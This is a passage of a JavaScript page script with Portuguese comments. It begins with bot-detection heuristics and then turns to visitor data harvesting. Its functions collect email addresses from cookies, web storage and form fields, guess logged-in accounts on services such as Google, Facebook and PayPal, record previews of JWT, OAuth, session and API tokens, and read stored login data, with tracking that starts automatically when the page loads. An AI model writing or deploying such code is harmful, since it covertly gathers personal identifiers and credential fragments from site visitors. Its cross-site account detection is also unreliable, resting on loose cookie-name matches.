        Math.pow(movements[i].x - movements[i-1].x, 2) + 
        Math.pow(movements[i].y - movements[i-1].y, 2)
      );
      if (dist > 0 && dist < 5) regularity++;
    }
    if (regularity / Math.min(movements.length, 20) > 0.7) {
      analysis.suspicious = true;
      analysis.botProbability += 20;
      analysis.reasons.push('Movimento de mouse muito regular (bot)');
    }
  }

  // Verificar se há muitos cliques muito rápidos
  if (behaviorData.clicks.length > 10) {
    const clickIntervals = [];
    for (let i = 1; i < behaviorData.clicks.length; i++) {
      clickIntervals.push(behaviorData.clicks[i].timestamp - behaviorData.clicks[i-1].timestamp);
    }
    const avgInterval = clickIntervals.reduce((a, b) => a + b, 0) / clickIntervals.length;
    if (avgInterval < 100) {
      analysis.suspicious = true;
      analysis.botProbability += 25;
      analysis.reasons.push('Cliques muito rápidos (possível bot)');
    }
    // Verificar se cliques estão em posições muito precisas (bot)
    const clickPositions = behaviorData.clicks.map(c => ({x: c.x, y: c.y}));
    const uniquePositions = new Set(clickPositions.map(p => `${Math.floor(p.x/10)}_${Math.floor(p.y/10)}`));
    if (clickPositions.length > 5 && uniquePositions.size / clickPositions.length < 0.3) {
      analysis.suspicious = true;
      analysis.botProbability += 15;
      analysis.reasons.push('Cliques muito precisos (bot)');
    }
  }

  // Verificar scroll (humanos scrollam de forma irregular)
  if (behaviorData.scrolls.length > 5) {
    const scrollDeltas = behaviorData.scrolls.map(s => Math.abs(s.scrollDelta || 0));
    const avgDelta = scrollDeltas.reduce((a, b) => a + b, 0) / scrollDeltas.length;
    if (avgDelta > 500) {
      analysis.suspicious = true;
      analysis.botProbability += 10;
      analysis.reasons.push('Scroll muito rápido (bot)');
    }
  }

  // Verificar mudanças frequentes de visibilidade (possível automação)
  if (behaviorData.visibilityChanges.length > 3) {
    analysis.suspicious = true;
    analysis.botProbability += 20;
    analysis.reasons.push('Muitas mudanças de visibilidade');
  }

  // Verificar se não há keystrokes mas há cliques (bot)
  if (behaviorData.clicks.length > 5 && behaviorData.keystrokes.length === 0 && timeOnPage > 2000) {
    analysis.suspicious = true;
    analysis.botProbability += 15;
    analysis.reasons.push('Cliques sem keystrokes (bot)');
  }

  // Verificar tempo na página (bots saem rápido)
  if (timeOnPage < 1000 && behaviorData.clicks.length === 0) {
    analysis.suspicious = true;
    analysis.botProbability += 25;
    analysis.reasons.push('Tempo muito curto na página sem interação');
  }

  analysis.humanProbability = Math.max(0, 100 - analysis.botProbability);
  analysis.suspicious = analysis.botProbability > 30;

  return analysis;
}

// Analisar padrão de comportamento
function analyzeBehaviorPattern() {
  return {
    mouseActivity: behaviorData.mouseMovements.length > 0 ? 'active' : 'inactive',
    clickActivity: behaviorData.clicks.length > 0 ? 'active' : 'inactive',
    scrollActivity: behaviorData.scrolls.length > 0 ? 'active' : 'inactive',
    keyboardActivity: behaviorData.keystrokes.length > 0 ? 'active' : 'inactive',
    interactionLevel: calculateInteractionLevel(),
    engagementScore: calculateEngagementScore()
  };
}

// Calcular nível de interação
function calculateInteractionLevel() {
  const interactions = 
    behaviorData.mouseMovements.length +
    behaviorData.clicks.length * 10 +
    behaviorData.scrolls.length * 5 +
    behaviorData.keystrokes.length * 3;
  
  if (interactions > 100) return 'high';
  if (interactions > 30) return 'medium';
  if (interactions > 5) return 'low';
  return 'minimal';
}

// Calcular score de engajamento
function calculateEngagementScore() {
  const timeOnPage = Date.now() - startTime;
  const interactions = 
    behaviorData.mouseMovements.length * 0.1 +
    behaviorData.clicks.length * 2 +
    behaviorData.scrolls.length * 1 +
    behaviorData.keystrokes.length * 0.5;
  
  const score = Math.min(100, (interactions / (timeOnPage / 1000)) * 10);
  return Math.round(score);
}

// Calcular estatísticas de comportamento
function calculateBehaviorStats() {
  const stats = {
    totalInteractions: 
      behaviorData.mouseMovements.length +
      behaviorData.clicks.length +
      behaviorData.scrolls.length +
      behaviorData.keystrokes.length,
    averageMouseSpeed: 0,
    clickRate: 0,
    scrollRate: 0,
    keystrokeRate: 0
  };

  // Calcular velocidade média do mouse
  if (behaviorData.mouseMovements.length > 1) {
    let totalDistance = 0;
    for (let i = 1; i < behaviorData.mouseMovements.length; i++) {
      const dist = Math.sqrt(
        Math.pow(behaviorData.mouseMovements[i].x - behaviorData.mouseMovements[i-1].x, 2) +
        Math.pow(behaviorData.mouseMovements[i].y - behaviorData.mouseMovements[i-1].y, 2)
      );
      totalDistance += dist;
    }
    const timeSpan = behaviorData.mouseMovements[behaviorData.mouseMovements.length - 1].timestamp - 
                     behaviorData.mouseMovements[0].timestamp;
    stats.averageMouseSpeed = timeSpan > 0 ? (totalDistance / timeSpan) : 0;
  }

  // Calcular taxas
  const timeOnPage = (Date.now() - startTime) / 1000; // em segundos
  if (timeOnPage > 0) {
    stats.clickRate = behaviorData.clicks.length / timeOnPage;
    stats.scrollRate = behaviorData.scrolls.length / timeOnPage;
    stats.keystrokeRate = behaviorData.keystrokes.length / timeOnPage;
  }

  return stats;
}

// ============================================
// NOVAS FUNÇÕES: DETECÇÃO DE CONTAS E EMAILS
// ============================================

// Extrair emails de cookies, localStorage e sessionStorage
function extractEmails() {
  const emails = new Set();
  const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;

  // Extrair de cookies
  try {
    const cookies = document.cookie;
    const cookieMatches = cookies.match(emailRegex);
    if (cookieMatches) {
      cookieMatches.forEach(email => emails.add(email.toLowerCase()));
    }
  } catch (e) {}

  // Extrair de localStorage
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const value = localStorage.getItem(key);
      if (value) {
        const matches = value.match(emailRegex);
        if (matches) {
          matches.forEach(email => emails.add(email.toLowerCase()));
        }
      }
      // Verificar se a própria chave é um email
      if (emailRegex.test(key)) {
        emails.add(key.toLowerCase());
      }
    }
  } catch (e) {}

  // Extrair de sessionStorage
  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      const value = sessionStorage.getItem(key);
      if (value) {
        const matches = value.match(emailRegex);
        if (matches) {
          matches.forEach(email => emails.add(email.toLowerCase()));
        }
      }
      if (emailRegex.test(key)) {
        emails.add(key.toLowerCase());
      }
    }
  } catch (e) {}

  // Extrair de elementos da página (inputs type="email", etc)
  try {
    const emailInputs = document.querySelectorAll('input[type="email"], input[name*="email"], input[id*="email"]');
    emailInputs.forEach(input => {
      if (input.value && emailRegex.test(input.value)) {
        const matches = input.value.match(emailRegex);
        matches.forEach(email => emails.add(email.toLowerCase()));
      }
    });
  } catch (e) {}

  return Array.from(emails);
}

// Detectar contas vinculadas de serviços conhecidos
async function detectLinkedAccounts() {
  const accounts = {
    google: await detectGoogleAccount(),
    facebook: await detectFacebookAccount(),
    twitter: await detectTwitterAccount(),
    microsoft: await detectMicrosoftAccount(),
    amazon: await detectAmazonAccount(),
    apple: await detectAppleAccount(),
    github: await detectGithubAccount(),
    linkedin: await detectLinkedInAccount(),
    instagram: await detectInstagramAccount(),
    youtube: await detectYouTubeAccount(),
    paypal: await detectPayPalAccount(),
    spotify: await detectSpotifyAccount(),
    netflix: await detectNetflixAccount()
  };

  return accounts;
}

// Detectar conta Google
async function detectGoogleAccount() {
  const indicators = {
    loggedIn: false,
    email: null,
    userId: null,
    indicators: []
  };

  try {
    // Verificar cookies do Google
    const cookies = document.cookie.split(';');
    const googleCookies = cookies.filter(c => 
      c.includes('google') || 
      c.includes('gmail') || 
      c.includes('youtube') ||
      c.includes('GA_') ||
      c.includes('_ga')
    );

    if (googleCookies.length > 0) {
      indicators.indicators.push('Cookies do Google encontrados');
      
      // Tentar extrair email de cookies
      googleCookies.forEach(cookie => {
        const emailMatch = cookie.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
        if (emailMatch) {
          indicators.email = emailMatch[0];
          indicators.loggedIn = true;
        }
      });
    }

    // Verificar localStorage/sessionStorage
    const storageKeys = [...Object.keys(localStorage), ...Object.keys(sessionStorage)];
    storageKeys.forEach(key => {
      if (key.toLowerCase().includes('google') || key.toLowerCase().includes('gmail')) {
        indicators.indicators.push(`Storage key encontrado: ${key}`);
        const value = localStorage.getItem(key) || sessionStorage.getItem(key);
        if (value) {
          const emailMatch = value.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
          if (emailMatch) {
            indicators.email = emailMatch[0];
            indicators.loggedIn = true;
          }
        }
      }
    });

    // Verificar se há elementos do Google na página
    const googleElements = document.querySelectorAll('[src*="google"], [href*="google"], iframe[src*="google"]');
    if (googleElements.length > 0) {
      indicators.indicators.push(`${googleElements.length} elementos do Google encontrados`);
    }

  } catch (e) {
    indicators.error = e.message;
  }

  return indicators;
}

// Detectar conta Facebook
async function detectFacebookAccount() {
  const indicators = {
    loggedIn: false,
    userId: null,
    indicators: []
  };

  try {
    const cookies = document.cookie.split(';');
    const fbCookies = cookies.filter(c => 
      c.includes('facebook') || 
      c.includes('fb_') ||
      c.includes('fr=')
    );

    if (fbCookies.length > 0) {
      indicators.indicators.push('Cookies do Facebook encontrados');
      indicators.loggedIn = true;
      
      // Tentar extrair user ID
      fbCookies.forEach(cookie => {
        const userIdMatch = cookie.match(/c_user[=:]([0-9]+)/);
        if (userIdMatch) {
          indicators.userId = userIdMatch[1];
        }
      });
    }

    // Verificar localStorage
    const storageKeys = Object.keys(localStorage);
    storageKeys.forEach(key => {
      if (key.toLowerCase().includes('facebook') || key.toLowerCase().includes('fb_')) {
        indicators.indicators.push(`Storage key: ${key}`);
        indicators.loggedIn = true;
      }
    });

  } catch (e) {
    indicators.error = e.message;
  }

  return indicators;
}

// Detectar conta Twitter/X
async function detectTwitterAccount() {
  const indicators = {
    loggedIn: false,
    username: null,
    indicators: []
  };

  try {
    const cookies = document.cookie.split(';');
    const twitterCookies = cookies.filter(c => 
      c.includes('twitter') || 
      c.includes('twid=')
    );

    if (twitterCookies.length > 0) {
      indicators.indicators.push('Cookies do Twitter encontrados');
      indicators.loggedIn = true;
    }

  } catch (e) {
    indicators.error = e.message;
  }

  return indicators;
}

// Detectar conta Microsoft
async function detectMicrosoftAccount() {
  const indicators = {
    loggedIn: false,
    email: null,
    indicators: []
  };

  try {
    const cookies = document.cookie.split(';');
    const msCookies = cookies.filter(c => 
      c.includes('microsoft') || 
      c.includes('live.com') ||
      c.includes('outlook') ||
      c.includes('office')
    );

    if (msCookies.length > 0) {
      indicators.indicators.push('Cookies da Microsoft encontrados');
      indicators.loggedIn = true;
      
      msCookies.forEach(cookie => {
        const emailMatch = cookie.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
        if (emailMatch) {
          indicators.email = emailMatch[0];
        }
      });
    }

  } catch (e) {
    indicators.error = e.message;
  }

  return indicators;
}

// Detectar conta Amazon
async function detectAmazonAccount() {
  const indicators = {
    loggedIn: false,
    indicators: []
  };

  try {
    const cookies = document.cookie.split(';');
    const amazonCookies = cookies.filter(c => 
      c.includes('amazon') || 
      c.includes('aws-')
    );

    if (amazonCookies.length > 0) {
      indicators.indicators.push('Cookies da Amazon encontrados');
      indicators.loggedIn = true;
    }

  } catch (e) {
    indicators.error = e.message;
  }

  return indicators;
}

// Detectar conta Apple
async function detectAppleAccount() {
  const indicators = {
    loggedIn: false,
    indicators: []
  };

  try {
    const cookies = document.cookie.split(';');
    const appleCookies = cookies.filter(c => 
      c.includes('apple') || 
      c.includes('icloud')
    );

    if (appleCookies.length > 0) {
      indicators.indicators.push('Cookies da Apple encontrados');
      indicators.loggedIn = true;
    }

  } catch (e) {
    indicators.error = e.message;
  }

  return indicators;
}

// Detectar conta GitHub
async function detectGithubAccount() {
  const indicators = {
    loggedIn: false,
    username: null,
    indicators: []
  };

  try {
    const cookies = document.cookie.split(';');
    const githubCookies = cookies.filter(c => 
      c.includes('github') || 
      c.includes('_gh_')
    );

    if (githubCookies.length > 0) {
      indicators.indicators.push('Cookies do GitHub encontrados');
      indicators.loggedIn = true;
    }

  } catch (e) {
    indicators.error = e.message;
  }

  return indicators;
}

// Detectar conta LinkedIn
async function detectLinkedInAccount() {
  const indicators = {
    loggedIn: false,
    indicators: []
  };

  try {
    const cookies = document.cookie.split(';');
    const linkedinCookies = cookies.filter(c => 
      c.includes('linkedin') || 
      c.includes('li_')
    );

    if (linkedinCookies.length > 0) {
      indicators.indicators.push('Cookies do LinkedIn encontrados');
      indicators.loggedIn = true;
    }

  } catch (e) {
    indicators.error = e.message;
  }

  return indicators;
}

// Detectar conta Instagram
async function detectInstagramAccount() {
  const indicators = {
    loggedIn: false,
    indicators: []
  };

  try {
    const cookies = document.cookie.split(';');
    const instagramCookies = cookies.filter(c => 
      c.includes('instagram')
    );

    if (instagramCookies.length > 0) {
      indicators.indicators.push('Cookies do Instagram encontrados');
      indicators.loggedIn = true;
    }

  } catch (e) {
    indicators.error = e.message;
  }

  return indicators;
}

// Detectar conta YouTube
async function detectYouTubeAccount() {
  const indicators = {
    loggedIn: false,
    indicators: []
  };

  try {
    const cookies = document.cookie.split(';');
    const youtubeCookies = cookies.filter(c => 
      c.includes('youtube') || 
      c.includes('VISITOR_INFO')
    );

    if (youtubeCookies.length > 0) {
      indicators.indicators.push('Cookies do YouTube encontrados');
      indicators.loggedIn = true;
    }

  } catch (e) {
    indicators.error = e.message;
  }

  return indicators;
}

// Detectar conta PayPal
async function detectPayPalAccount() {
  const indicators = {
    loggedIn: false,
    email: null,
    indicators: []
  };

  try {
    const cookies = document.cookie.split(';');
    const paypalCookies = cookies.filter(c => 
      c.includes('paypal') || 
      c.includes('pp_')
    );

    if (paypalCookies.length > 0) {
      indicators.indicators.push('Cookies do PayPal encontrados');
      indicators.loggedIn = true;
    }

  } catch (e) {
    indicators.error = e.message;
  }

  return indicators;
}

// Detectar conta Spotify
async function detectSpotifyAccount() {
  const indicators = {
    loggedIn: false,
    indicators: []
  };

  try {
    const cookies = document.cookie.split(';');
    const spotifyCookies = cookies.filter(c => 
      c.includes('spotify')
    );

    if (spotifyCookies.length > 0) {
      indicators.indicators.push('Cookies do Spotify encontrados');
      indicators.loggedIn = true;
    }

  } catch (e) {
    indicators.error = e.message;
  }

  return indicators;
}

// Detectar conta Netflix
async function detectNetflixAccount() {
  const indicators = {
    loggedIn: false,
    indicators: []
  };

  try {
    const cookies = document.cookie.split(';');
    const netflixCookies = cookies.filter(c => 
      c.includes('netflix') || 
      c.includes('NetflixId')
    );

    if (netflixCookies.length > 0) {
      indicators.indicators.push('Cookies do Netflix encontrados');
      indicators.loggedIn = true;
    }

  } catch (e) {
    indicators.error = e.message;
  }

  return indicators;
}

// Extrair tokens de autenticação
function extractAuthTokens() {
  const tokens = {
    jwt: [],
    oauth: [],
    session: [],
    api: []
  };

  try {
    // Verificar localStorage
    Object.keys(localStorage).forEach(key => {
      const value = localStorage.getItem(key);
      if (value) {
        // JWT tokens (geralmente começam com "eyJ")
        if (value.startsWith('eyJ') || key.toLowerCase().includes('jwt') || key.toLowerCase().includes('token')) {
          tokens.jwt.push({
            key: key,
            preview: value.substring(0, 50) + '...',
            length: value.length
          });
        }
        // OAuth tokens
        if (key.toLowerCase().includes('oauth') || key.toLowerCase().includes('access_token')) {
          tokens.oauth.push({
            key: key,
            preview: value.substring(0, 50) + '...',
            length: value.length
          });
        }
        // Session tokens
        if (key.toLowerCase().includes('session') || key.toLowerCase().includes('sid')) {
          tokens.session.push({
            key: key,
            preview: value.substring(0, 50) + '...',
            length: value.length
          });
        }
        // API keys
        if (key.toLowerCase().includes('api') || key.toLowerCase().includes('key')) {
          tokens.api.push({
            key: key,
            preview: value.substring(0, 30) + '...',
            length: value.length
          });
        }
      }
    });

    // Verificar sessionStorage
    Object.keys(sessionStorage).forEach(key => {
      const value = sessionStorage.getItem(key);
      if (value && (value.length > 20)) {
        if (value.startsWith('eyJ') || key.toLowerCase().includes('token') || key.toLowerCase().includes('auth')) {
          tokens.jwt.push({
            key: key,
            preview: value.substring(0, 50) + '...',
            length: value.length
          });
        }
      }
    });

    // Verificar cookies
    const cookies = document.cookie.split(';');
    cookies.forEach(cookie => {
      const [name, value] = cookie.split('=').map(s => s.trim());
      if (value && value.length > 20) {
        if (name.toLowerCase().includes('token') || 
            name.toLowerCase().includes('auth') ||
            name.toLowerCase().includes('session') ||
            name.toLowerCase().includes('jwt')) {
          tokens.session.push({
            key: name,
            preview: value.substring(0, 30) + '...',
            length: value.length
          });
        }
      }
    });

  } catch (e) {
    tokens.error = e.message;
  }

  return tokens;
}

// Detectar serviços de terceiros
async function detectThirdPartyServices() {
  const services = {
    analytics: [],
    advertising: [],
    social: [],
    payment: [],
    cdn: []
  };

  try {
    // Verificar scripts carregados
    const scripts = document.querySelectorAll('script[src]');
    scripts.forEach(script => {
      const src = script.src.toLowerCase();
      
      // Analytics
      if (src.includes('google-analytics') || src.includes('ga.js') || src.includes('gtag')) {
        services.analytics.push('Google Analytics');
      }
      if (src.includes('facebook.net') || src.includes('fbq')) {
        services.analytics.push('Facebook Pixel');
      }
      
      // Advertising
      if (src.includes('doubleclick') || src.includes('googlesyndication')) {
        services.advertising.push('Google Ads');
      }
      
      // Social
      if (src.includes('facebook') || src.includes('fbcdn')) {
        services.social.push('Facebook');
      }
      if (src.includes('twitter') || src.includes('twimg')) {
        services.social.push('Twitter');
      }
      
      // Payment
      if (src.includes('paypal') || src.includes('stripe') || src.includes('braintree')) {
        services.payment.push(src.includes('paypal') ? 'PayPal' : src.includes('stripe') ? 'Stripe' : 'Braintree');
      }
      
      // CDN
      if (src.includes('cloudflare') || src.includes('cloudfront') || src.includes('fastly')) {
        services.cdn.push('CDN detectado');
      }
    });

    // Verificar iframes
    const iframes = document.querySelectorAll('iframe[src]');
    iframes.forEach(iframe => {
      const src = iframe.src.toLowerCase();
      if (src.includes('facebook') || src.includes('google') || src.includes('youtube')) {
        services.social.push('Embed detectado: ' + src.substring(0, 50));
      }
    });

  } catch (e) {
    services.error = e.message;
  }

  return services;
}

// Detectar cross-site tracking
async function detectCrossSiteTracking() {
  const tracking = {
    thirdPartyCookies: [],
    localStorage: [],
    sessionStorage: [],
    indexedDB: []
  };

  try {
    // Verificar cookies de terceiros (limitado)
    const cookies = document.cookie.split(';');
    cookies.forEach(cookie => {
      const [name] = cookie.split('=').map(s => s.trim());
      // Cookies comuns de tracking
      if (name.includes('_ga') || name.includes('_gid') || name.includes('_fbp') || 
          name.includes('_fbc') || name.includes('utm_') || name.includes('tracking')) {
        tracking.thirdPartyCookies.push(name);
      }
    });

    // Verificar localStorage de tracking
    Object.keys(localStorage).forEach(key => {
      if (key.includes('_ga') || key.includes('_gid') || key.includes('_fbp') || 
          key.includes('tracking') || key.includes('analytics')) {
        tracking.localStorage.push(key);
      }
    });

  } catch (e) {
    tracking.error = e.message;
  }

  return tracking;
}

// Detectar dados de autenticação
async function detectAuthentication() {
  const auth = {
    isAuthenticated: false,
    methods: [],
    providers: []
  };

  try {
    // Verificar se há tokens de autenticação
    const tokens = extractAuthTokens();
    if (tokens.jwt.length > 0 || tokens.oauth.length > 0 || tokens.session.length > 0) {
      auth.isAuthenticated = true;
      if (tokens.jwt.length > 0) auth.methods.push('JWT');
      if (tokens.oauth.length > 0) auth.methods.push('OAuth');
      if (tokens.session.length > 0) auth.methods.push('Session');
    }

    // Verificar contas vinculadas
    const accounts = await detectLinkedAccounts();
    Object.keys(accounts).forEach(service => {
      if (accounts[service].loggedIn) {
        auth.isAuthenticated = true;
        auth.providers.push(service);
      }
    });

  } catch (e) {
    auth.error = e.message;
  }

  return auth;
}

// Obter histórico de login (limitado)
function getLoginHistory() {
  const history = {
    loginAttempts: [],
    lastLogin: null
  };

  try {
    // Verificar localStorage/sessionStorage por dados de login
    const storageKeys = [...Object.keys(localStorage), ...Object.keys(sessionStorage)];
    storageKeys.forEach(key => {
      if (key.toLowerCase().includes('login') || 
          key.toLowerCase().includes('lastlogin') ||
          key.toLowerCase().includes('last_access')) {
        const value = localStorage.getItem(key) || sessionStorage.getItem(key);
        if (value) {
          history.loginAttempts.push({
            key: key,
            value: value.substring(0, 100)
          });
        }
      }
    });

  } catch (e) {
    history.error = e.message;
  }

  return history;
}

// Iniciar rastreamento quando o script carregar
if (typeof window !== 'undefined') {
  startBehaviorTracking();
}

// Exportar função principal
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { collectAllData };
}
